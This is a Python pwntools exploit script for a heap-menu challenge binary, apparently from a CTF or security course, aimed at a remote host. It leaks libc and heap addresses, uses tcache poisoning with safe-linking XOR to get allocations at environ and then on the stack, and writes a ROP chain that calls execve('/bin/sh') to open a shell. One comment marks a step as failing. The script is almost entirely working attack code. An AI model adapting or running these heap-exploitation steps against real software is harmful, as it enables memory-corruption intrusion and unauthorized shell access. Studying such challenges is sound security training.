import os
import string
from itertools import chain
from struct import pack
from typing import Any, Callable, Iterable, List

from pwn import *
from pwnlib.gdb import Gdb

binary = './chal'
context.binary = elf = ELF(binary)
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

def flatten(items: Iterable) -> List[Any]:
    return list(chain.from_iterable(items))

def make_breakpoints(breakpoints: List[str]) -> List[str]:
    return list(map(lambda b: f'b* {b}', breakpoints))

def make_commands(args: List[str]) -> List[str]:
    return flatten(map(lambda a: [a], args))

breakpoints = [
    # '&main+118', # main RET
    # '&menu+125', # menu RET 
]
print_statements = []
breakpoints = make_breakpoints(breakpoints)
commands = make_commands(breakpoints + print_statements)

# LIBC
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

gdbscript = '''
continue
continue
''' + '\n'.join(commands)

# GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.

# with gdb.debug(binary, gdbscript=gdbscript) as p:
#     p: process
#     p.gdb: Gdb

# with process(binary) as p:
with remote('128.238.62.254', 12348) as p:

    is_remote = isinstance(p, remote)
    is_debuggable = not is_remote

    def send_cmd(cmd):
        if type(cmd) == str:
            cmd = cmd.encode()
        elif type(cmd) == int:
            cmd = str(cmd).encode()
        p.sendafter(b'>', cmd)

    def add(size: int):
        send_cmd(1)
        p.recvuntil(b'Size:\n')
        p.send(str(size).encode())

    def delete(idx: int):
        send_cmd(2)
        send_cmd(idx)

    def edit(idx: int, cmd: bytes):
        send_cmd(3)
        send_cmd(idx)
        p.recvuntil(b'Size:\n')
        p.send(str(len(cmd)).encode())
        p.recvuntil(b'Content:\n')
        p.send(cmd)

    def show(idx: int) -> bytes:
        send_cmd(4)
        send_cmd(idx)
        p.recvuntil(b'Content:\n').decode()
        data = p.recvuntil(b'===').rstrip(b'===')
        # log.info("Heap at idx %d: %s", idx, data)
        return data

    def exit():
        send_cmd(5)

    if is_remote:
        p.recvuntil(b'Please input your NetID (something like abc123): ')
        p.sendline(b'nf2137')

    SIZE = 0x20
    UNSORTED_BIN_SIZE = 0x418

    '''
    Leak LIBC
    '''
    add(UNSORTED_BIN_SIZE) # 0
    add(0x50) # 1
    delete(0)
    add(UNSORTED_BIN_SIZE) # 0

    main_arena = u64(show(0)[:8])
    libc_base: int = main_arena - 0x219ce0 # From main arena to libc.so.6 vmmap first entry
    environ: int = libc_base + 0x221200 # From main arena to p &environ

    libc.address = libc_base
    elf.libc.address = libc_base

    log.info(f'Main Arena: {hex(main_arena)}')
    log.info(f'LIBC base: {hex(libc_base)}')
    log.info(f'environ: {hex(environ)}')

    '''
    Get Heap leak
    '''
    add(SIZE) # 2
    delete(2)
    add(SIZE) # 2

    heap_base = u64(show(2)[:8]) << 12
    log.info(f'Heap: {hex(heap_base)}')

    '''
    Poison cache
    '''
    add(SIZE) # 3
    add(SIZE) # 4
    delete(4)
    delete(3)
    delete(2)
    add(SIZE) # 2

    curr = heap_base + 0x720
    fw = (curr >> 12) ^ environ

    log.info(f'array address (idx 2) for &environ: {hex(curr)}')
    log.info(f'fw &environ: {hex(fw)}')

    # Point to &environ
    edit(2, b'A' * (SIZE + 8) + p64(0x31) + p64(fw))

    '''
    Get environ stack
    '''
    add(SIZE) # 3
    add(SIZE) # 4 environ <-- FAILS HERE

    environ_stack = u64(show(4)[:8])
    log.info(f'environ_stack: {hex(environ_stack)}')

    '''
    Clobber Stack
    '''
    BIGGER_SIZE = SIZE * 4
    add(BIGGER_SIZE) # 5
    add(BIGGER_SIZE) # 6 
    add(BIGGER_SIZE) # 7
    delete(7)
    delete(6)
    delete(5)
    add(BIGGER_SIZE) # 5


    curr = heap_base + 0x7b0
    offset_to_rbp_address = 0x128

    fw = (curr >> 12) ^ (environ_stack - offset_to_rbp_address)
    log.info(f'array mem offset (idx 5) for environ {hex(curr)}')
    log.info(f'fw stack: {hex(fw)}')

    edit(5, b'A' * (BIGGER_SIZE + 8) + p64(0x81) + p64(fw))
    add(BIGGER_SIZE) # 6
    add(BIGGER_SIZE) # 7 --> stack

    '''
    Execute ROP
    '''
    rop = ROP([
        libc
    ])

    bin_sh = next(libc.search(b'/bin/sh\x00'))
    rop.execve(bin_sh, 0, 0)
    log.info(rop.dump())

    edit(7, p64(0xdeadbeef) + rop.chain())
    exit()
    p.interactive()
